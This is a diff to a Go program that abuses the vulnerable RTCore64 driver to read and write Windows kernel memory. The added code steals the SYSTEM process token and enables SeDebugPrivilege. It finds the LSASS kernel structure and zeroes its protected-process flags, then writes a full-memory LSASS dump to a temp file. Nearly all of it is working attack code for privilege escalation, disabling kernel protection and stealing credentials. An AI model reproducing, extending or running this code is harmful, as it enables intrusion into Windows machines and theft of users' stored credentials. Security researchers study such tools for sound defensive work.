@@ -12,26 +12,35 @@ import (
 	"io"
 	"net/http"
 	"os"
-
+    "strings"
+	"encoding/hex"
 
 	"golang.org/x/sys/windows"
+	
 )
 
 const (
 	RTCORE64_MEMORY_READ_CODE  = 0x80002048
 	RTCORE64_MEMORY_WRITE_CODE = 0x8000204c
 	SYSTEM_PID                 = 4
-	KERNEL_ADDRESS_MASK        = 0xFFFFF00000000000
+	KERNEL_ADDRESS_MASK        = 0xFFFF000000000000
 	SEARCH_RANGE               = 0x1000 
 	KNOWN_TOKEN_OFFSET         = 0x248  // The exact token offset for my testing VM
 
 	KEYSIZE = 32
 	IVSIZE  = 16
 
-
+    DONT_RESOLVE_DLL_REFERENCES = 0x00000001
+	PROCESS_ALL_ACCESS          = 0x1F0FFF
+	TH32CS_SNAPPROCESS          = 0x00000002
+	MAX_PATH                    = 260
 )
 
 
+var (
+	PPOffset  uint16
+	PPLOffset uint16
+)
 
 type RTCORE64_MEMORY_READ struct {
 	Pad0     [8]byte
@@ -53,14 +62,24 @@ type RTCORE64_MEMORY_WRITE struct {
 
 var (
 	modKernel32             = windows.NewLazySystemDLL("kernel32.dll")
+    modPsapi                = windows.NewLazySystemDLL("psapi.dll")
+    modDbghelp = windows.NewLazySystemDLL("Dbghelp.dll")
+
 	procDeviceIoControl     = modKernel32.NewProc("DeviceIoControl")
 	procCreateFileW         = modKernel32.NewProc("CreateFileW")
 	procCloseHandle         = modKernel32.NewProc("CloseHandle")
 	procGetCurrentProcessId = modKernel32.NewProc("GetCurrentProcessId")
 	procCreateProcessW      = modKernel32.NewProc("CreateProcessW")
 	procWaitForSingleObject = modKernel32.NewProc("WaitForSingleObject")
-	modPsapi                = windows.NewLazySystemDLL("psapi.dll")
 	procEnumDeviceDrivers   = modPsapi.NewProc("EnumDeviceDrivers")
+
+	procCreateToolhelp32Snapshot = modKernel32.NewProc("CreateToolhelp32Snapshot")
+    procProcess32First          = modKernel32.NewProc("Process32FirstW")
+    procProcess32Next           = modKernel32.NewProc("Process32NextW")
+    procOpenProcess             = modKernel32.NewProc("OpenProcess")
+    procMiniDumpWriteDump       = modDbghelp.NewProc("MiniDumpWriteDump")
+	procLoadLibraryExA          = modKernel32.NewProc("LoadLibraryExA")
+	procGetProcAddress          = modKernel32.NewProc("GetProcAddress")
 )
 
 func DeviceIoControl(hDevice windows.Handle, ioControlCode uint32, inBuffer *byte, inBufferSize uint32, outBuffer *byte, outBufferSize uint32, bytesReturned *uint32, overlapped *windows.Overlapped) (err error) {
@@ -227,15 +246,13 @@ func isValidToken(device windows.Handle, val uint64) bool {
         return false
     }
 
-    // Check if it's a kernel address (0xFFFF...)
-    const KERNEL_ADDRESS_MASK uint64 = 0xFFFF000000000000
     if (val & KERNEL_ADDRESS_MASK) != KERNEL_ADDRESS_MASK {
         return false
     }
 
-    
+   // fmt.Println(val)
     tokenAddr := val & ^uint64(0xF)
-
+   // fmt.Println(tokenAddr)
    
     buf := make([]byte, 8)
     err := ReadMemory(device, tokenAddr, buf) 
@@ -273,7 +290,7 @@ func FindOffsets(device windows.Handle, psInitialSystemProcessAddress uint64) (t
 	activeProcessLinksOffset = uniqueProcessIdOffset + 8
 	log.Printf("[*] Calculated ActiveProcessLinksOffset: 0x%X", activeProcessLinksOffset)
 
-
+/*
 	var candidates []uint64
 	for i := uint64(0); i < SEARCH_RANGE; i += 8 {
 		val, err := ReadMemoryDWORD64(device, psInitialSystemProcessAddress+i)
@@ -285,8 +302,9 @@ func FindOffsets(device windows.Handle, psInitialSystemProcessAddress uint64) (t
 			candidates = append(candidates, i)
 		}
 	}
-
-	return candidates[0], activeProcessLinksOffset, uniqueProcessIdOffset, nil
+*/
+    return KNOWN_TOKEN_OFFSET, activeProcessLinksOffset, uniqueProcessIdOffset, nil
+	//return candidates[0], activeProcessLinksOffset, uniqueProcessIdOffset, nil
 }
 
 
@@ -377,7 +395,7 @@ func RunDriverService(driverPath string) error {
 	}
 	defer procCloseServiceHandle.Call(hSCManager)
 
-	serviceName := "MyRTCore64"
+	serviceName := "MyRTCore64Servisssssssssssssssss"
 	driverPathPtr := syscall.StringToUTF16Ptr(driverPath)
 	serviceNamePtr := syscall.StringToUTF16Ptr(serviceName)
 
@@ -433,6 +451,301 @@ func ReadFileBytes(path string) ([]byte, error) {
 	return data, err
 }
 
+// --------------------
+// Helper: lsass dump helper functions
+// --------------------
+
+func CreateToolhelp32Snapshot(flags, processID uint32) (windows.Handle, error) {
+    ret, _, err := procCreateToolhelp32Snapshot.Call(
+        uintptr(flags),
+        uintptr(processID),
+    )
+    if ret == uintptr(windows.InvalidHandle) {
+        return windows.InvalidHandle, err
+    }
+    return windows.Handle(ret), nil
+}
+
+func Process32First(snapshot windows.Handle, processEntry *windows.ProcessEntry32) error {
+    ret, _, err := procProcess32First.Call(
+        uintptr(snapshot),
+        uintptr(unsafe.Pointer(processEntry)),
+    )
+    if ret == 0 {
+        return err
+    }
+    return nil
+}
+
+func Process32Next(snapshot windows.Handle, processEntry *windows.ProcessEntry32) error {
+    ret, _, err := procProcess32Next.Call(
+        uintptr(snapshot),
+        uintptr(unsafe.Pointer(processEntry)),
+    )
+    if ret == 0 {
+        return err
+    }
+    return nil
+}
+
+func OpenProcess(desiredAccess uint32, inheritHandle bool, processId uint32) (windows.Handle, error) {
+    inherit := uint32(0)
+    if inheritHandle {
+        inherit = 1
+    }
+    
+    ret, _, err := procOpenProcess.Call(
+        uintptr(desiredAccess),
+        uintptr(inherit),
+        uintptr(processId),
+    )
+    if ret == 0 {
+        return windows.InvalidHandle, err
+    }
+    return windows.Handle(ret), nil
+}
+
+func CreateFile(filename string, desiredAccess, shareMode uint32, securityAttributes *windows.SecurityAttributes, creationDisposition, flagsAndAttributes uint32, templateFile windows.Handle) (windows.Handle, error) {
+    filenamePtr, err := windows.UTF16PtrFromString(filename)
+    if err != nil {
+        return windows.InvalidHandle, err
+    }
+    
+    ret, _, err := procCreateFileW.Call(
+        uintptr(unsafe.Pointer(filenamePtr)),
+        uintptr(desiredAccess),
+        uintptr(shareMode),
+        uintptr(unsafe.Pointer(securityAttributes)),
+        uintptr(creationDisposition),
+        uintptr(flagsAndAttributes),
+        uintptr(templateFile),
+    )
+    if ret == uintptr(windows.InvalidHandle) {
+        return windows.InvalidHandle, err
+    }
+    return windows.Handle(ret), nil
+}
+
+func MiniDumpWriteDump(process windows.Handle, processId uint32, file windows.Handle, dumpType uint32, exceptionParam uintptr, userStreamParam uintptr, callbackParam uintptr) error {
+    ret, _, err := procMiniDumpWriteDump.Call(
+        uintptr(process),
+        uintptr(processId),
+        uintptr(file),
+        uintptr(dumpType),
+        exceptionParam,
+        userStreamParam,
+        callbackParam,
+    )
+    if ret == 0 {
+        return err
+    }
+    return nil
+}
+
+// to find process ID by name
+func FindProcessID(name string) (uint32, error) {
+    snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
+    if err != nil {
+        return 0, err
+    }
+    defer windows.CloseHandle(snapshot)
+
+    var entry windows.ProcessEntry32
+    entry.Size = uint32(unsafe.Sizeof(entry))
+    
+    err = Process32First(snapshot, &entry)
+    if err != nil {
+        return 0, err
+    }
+    
+    for {
+        processName := windows.UTF16ToString(entry.ExeFile[:])
+        if strings.EqualFold(strings.TrimSpace(processName), name) {
+            return entry.ProcessID, nil
+        }
+        
+        err = windows.Process32Next(snapshot, &entry)
+        if err != nil {
+            break
+        }
+    }
+    
+    return 0, fmt.Errorf("process not found")
+}
+
+
+// function to enable SeDebugPrivilege
+func EnableDebugPrivilege() error {
+    var token windows.Token
+    currentProcess, _ := windows.GetCurrentProcess()
+    err := windows.OpenProcessToken(currentProcess, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
+    if err != nil {
+        return err
+    }
+    defer token.Close()
+
+    var luid windows.LUID
+    err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
+    if err != nil {
+        return err
+    }
+
+    privileges := windows.Tokenprivileges{}
+    privileges.PrivilegeCount = 1
+    privileges.Privileges[0] = windows.LUIDAndAttributes{
+        Luid: luid,
+        Attributes: windows.SE_PRIVILEGE_ENABLED,
+    }
+
+    return windows.AdjustTokenPrivileges(token, false, &privileges, uint32(unsafe.Sizeof(privileges)), nil, nil)
+}
+
+
+
+func FindLsassEPROCESS(device windows.Handle, psInitialSystemProcessAddress, activeProcessLinksOffset, uniqueProcessIdOffset uint64, lsassPID uint32) (uint64, error) {
+	currentProcess := psInitialSystemProcessAddress
+	var lsassEPROCESS uint64
+
+	for {
+		// Read the process ID
+		pid, err := ReadMemoryDWORD64(device, currentProcess+uniqueProcessIdOffset)
+		if err != nil {
+			return 0, fmt.Errorf("failed to read process ID at 0x%X: %v", currentProcess+uniqueProcessIdOffset, err)
+		}
+
+		// Check if this is the LSASS process
+		if uint32(pid) == lsassPID {
+			lsassEPROCESS = currentProcess
+			log.Printf("[*] Found LSASS EPROCESS at 0x%X", lsassEPROCESS)
+			break
+		}
+
+		// Get the next process in the list
+		flink, err := ReadMemoryDWORD64(device, currentProcess+activeProcessLinksOffset)
+		if err != nil {
+			return 0, fmt.Errorf("failed to read FLINK at 0x%X: %v", currentProcess+activeProcessLinksOffset, err)
+		}
+
+		// Calculate the next process address
+		nextProcess := flink - activeProcessLinksOffset
+
+		// Check if we've looped back to the beginning
+		if nextProcess == psInitialSystemProcessAddress {
+			return 0, fmt.Errorf("LSASS process not found in the process list")
+		}
+
+		currentProcess = nextProcess
+	}
+
+	return lsassEPROCESS, nil
+}
+
+func DisablePPL(device windows.Handle, lsassEPROCESS uint64) error {
+	// Calculate the addresses of the PP and PPL flags
+	ppFlagAddress := lsassEPROCESS + uint64(PPOffset)
+	pplFlagAddress := lsassEPROCESS + uint64(PPLOffset)
+
+	log.Printf("[*] PP flag address: 0x%X", ppFlagAddress)
+	log.Printf("[*] PPL flag address: 0x%X", pplFlagAddress)
+
+	// Write 0 to disable PPL protection
+	log.Println("[*] Disabling PP protection...")
+	err := WriteMemoryPrimitive(device, 1, ppFlagAddress, 0)
+	if err != nil {
+		return fmt.Errorf("failed to write to PP flag: %v", err)
+	}
+
+	log.Println("[*] Disabling PPL protection...")
+	err = WriteMemoryPrimitive(device, 1, pplFlagAddress, 0)
+	if err != nil {
+		return fmt.Errorf("failed to write to PPL flag: %v", err)
+	}
+
+	log.Println("[+] PPL protection disabled successfully")
+	return nil
+}
+
+
+
+// --------------------
+// Helper: PPL and PPO disable helper functions
+// --------------------
+
+
+func loadLibraryExA(name string, flags uintptr) (uintptr, error) {
+	ret, _, err := procLoadLibraryExA.Call(
+		uintptr(unsafe.Pointer(syscall.StringBytePtr(name))),
+		0,
+		flags,
+	)
+	if ret == 0 {
+		return 0, err
+	}
+	return ret, nil
+}
+
+func getProcAddress(module uintptr, procName string) (uintptr, error) {
+	ret, _, err := procGetProcAddress.Call(
+		module,
+		uintptr(unsafe.Pointer(syscall.StringBytePtr(procName))),
+	)
+	if ret == 0 {
+		return 0, err
+	}
+	return ret, nil
+}
+
+func Read16(device windows.Handle, addr uint64) (uint16, error) {
+	val, err := ReadMemoryPrimitive(device, 2, addr)
+	if err != nil {
+		return 0, err
+	}
+	return uint16(val), nil
+}
+
+func FindPPOffsets(device windows.Handle) error {
+	hNtos, err := loadLibraryExA("C:\\Windows\\System32\\ntoskrnl.exe", DONT_RESOLVE_DLL_REFERENCES)
+	if err != nil || hNtos == 0 {
+		return fmt.Errorf("failed to map ntoskrnl.exe: %v", err)
+	}
+
+	PsIsProtectedProcessPTR, err := getProcAddress(hNtos, "PsIsProtectedProcess")
+	if err != nil {
+		return fmt.Errorf("GetProcAddress PsIsProtectedProcess failed: %v", err)
+	}
+	PPrva := PsIsProtectedProcessPTR - hNtos
+
+	PsIsProtectedProcessLightPTR, err := getProcAddress(hNtos, "PsIsProtectedProcessLight")
+	if err != nil {
+		return fmt.Errorf("GetProcAddress PsIsProtectedProcessLight failed: %v", err)
+	}
+	PPLrva := PsIsProtectedProcessLightPTR - hNtos
+
+	krnlBase, err := GetNtoskrnlBase()
+	if err != nil {
+		return fmt.Errorf("failed to get kernel base: %v", err)
+	}
+
+	realPPAddr := uint64(krnlBase) + uint64(PPrva)
+	realPPLAddr := uint64(krnlBase) + uint64(PPLrva)
+
+	ppVal, err := Read16(device, realPPAddr+0x2)
+	if err != nil {
+		return fmt.Errorf("failed to read at 0x%X: %v", realPPAddr+0x2, err)
+	}
+	PPOffset = ppVal
+
+	pplVal, err := Read16(device, realPPLAddr+0x2)
+	if err != nil {
+		return fmt.Errorf("failed to read at 0x%X: %v", realPPLAddr+0x2, err)
+	}
+	PPLOffset = pplVal
+
+	fmt.Printf("PPOffset = 0x%X\n", PPOffset)
+	fmt.Printf("PPLOffset = 0x%X\n", PPLOffset)
+
+	return nil
+}
 
 
 func main() {
@@ -533,6 +846,7 @@ func main() {
 	fmt.Printf("[+] activeProcessLinksOffset = 0x%x\n", activeProcessLinksOffset)
 	fmt.Printf("[+] uniqueProcessIdOffset = 0x%x\n", uniqueProcessIdOffset)
 
+
 	systemProcessToken, err := ReadMemoryDWORD64(device, psInitialSystemProcessAddress+tokenOffset)
 	if err != nil {
 		log.Fatal("[!] Failed to read system process token")
@@ -571,6 +885,7 @@ func main() {
 	currentProcessToken := currentProcessFastToken &^ 15
 	log.Printf("[*] Current process token: 0x%X", currentProcessToken)
 
+/*
 	log.Println("[*] Stealing System process token...")
 	err = WriteMemoryDWORD64(device, currentProcessAddress+tokenOffset, currentProcessTokenReferenceCounter|systemProcessToken)
 	if err != nil {
@@ -601,4 +916,103 @@ func main() {
 	defer CloseHandle(processInfo.Thread)
 
 	WaitForSingleObject(processInfo.Process, windows.INFINITE)
+	
+*/
+
+    log.Println("[*] Stealing System process token...")
+    err = WriteMemoryDWORD64(device, currentProcessAddress+tokenOffset, currentProcessTokenReferenceCounter|systemProcessToken)
+    if err != nil {
+        log.Fatal("[!] Failed to write new token")
+    }
+    
+log.Printf("[*] stealing system token success")
+    // Call this after stealing the token but before opening LSASS
+err = EnableDebugPrivilege()
+if err != nil {
+    log.Fatalf("[!] Failed to enable debug privilege: %v", err)
 }
+
+log.Printf("[*] enable debug privilege success")
+
+   // disable PPL/PPO
+    
+    lsassPID, err := FindProcessID("lsass.exe")
+	if err != nil {
+		log.Fatalf("[!] Failed to find LSASS PID: %v", err)
+	}
+	log.Printf("[*] LSASS PID: %d", lsassPID)
+
+	err = FindPPOffsets(device)
+	if err != nil {
+		log.Fatalf("[!] Failed to find PP offsets: %v", err)
+	}
+
+	// Find the LSASS EPROCESS structure
+	lsassEPROCESS, err := FindLsassEPROCESS(device, psInitialSystemProcessAddress, activeProcessLinksOffset, uniqueProcessIdOffset, lsassPID)
+	if err != nil {
+		log.Fatalf("[!] Failed to find LSASS EPROCESS: %v", err)
+	}
+
+	// Disable PPL protection by writing 0 to the appropriate addresses
+	err = DisablePPL(device, lsassEPROCESS)
+	if err != nil {
+		log.Fatalf("[!] Failed to disable PPL protection: %v", err)
+	}   
+
+hProcess, err := windows.OpenProcess(
+    windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ,
+    false,
+    lsassPID,
+)
+if err != nil {
+    log.Fatalf("[!] Failed to open LSASS process: %v", err)
+}
+defer windows.CloseHandle(hProcess)
+
+outputFile := "C:\\Windows\\Temp\\lsass.dmp"
+hFile, err := windows.CreateFile(
+    windows.StringToUTF16Ptr(outputFile),
+    windows.GENERIC_WRITE,
+    0,
+    nil,
+    windows.CREATE_ALWAYS,
+    windows.FILE_ATTRIBUTE_NORMAL,
+    0,
+)
+if err != nil {
+    log.Fatalf("[!] Failed to create dump file: %v", err)
+}
+defer windows.CloseHandle(hFile)
+
+log.Printf("[*] create dump file success")
+
+// Call MiniDumpWriteDump
+ret, _, err := procMiniDumpWriteDump.Call(
+    uintptr(hProcess),
+    uintptr(lsassPID),
+    uintptr(hFile),
+    2, // MiniDumpWithFullMemory
+    0,
+    0,
+    0,
+)
+if ret == 0 {
+    log.Fatalf("[!] Failed to dump LSASS: %v", err)
+}
+log.Printf("[+] LSASS dumped to %s", outputFile)
+
+// Close the dump file handle before reading
+windows.CloseHandle(hFile)
+
+// Read the file content
+data, err := os.ReadFile(outputFile)
+if err != nil {
+    log.Fatalf("[!] Failed to read dump file: %v", err)
+}
+
+// Print first 256 bytes in hex (to avoid flooding the terminal)
+fmt.Printf("[*] First 256 bytes of dump:\n%s\n",
+    hex.Dump(data[:256]))
+
+}
+
